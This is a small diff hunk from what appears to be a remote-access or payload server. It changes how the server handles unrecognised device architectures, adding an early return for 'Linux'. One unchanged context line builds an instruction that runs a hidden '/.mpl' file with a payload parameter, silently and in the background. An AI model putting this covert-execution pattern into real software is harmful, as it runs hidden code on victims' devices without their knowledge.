@@ -129,8 +129,11 @@ class Server:
             "/.mpl "+payload_parameter+" 2>/dev/null &\n"
             return (instructions,payload)
         else:
-            if "GET / HTTP/1.1" in device_arch:
-                h.info_error("The device is not recognized!")
+            if device_arch == "Linux":
+                self.verbose_print("")
+                return
+            elif "GET / HTTP/1.1" in device_arch:
+                h.info_error("The device is not recognized!!!")
                 return
             else:
                 h.info_error("The device is not recognized!")
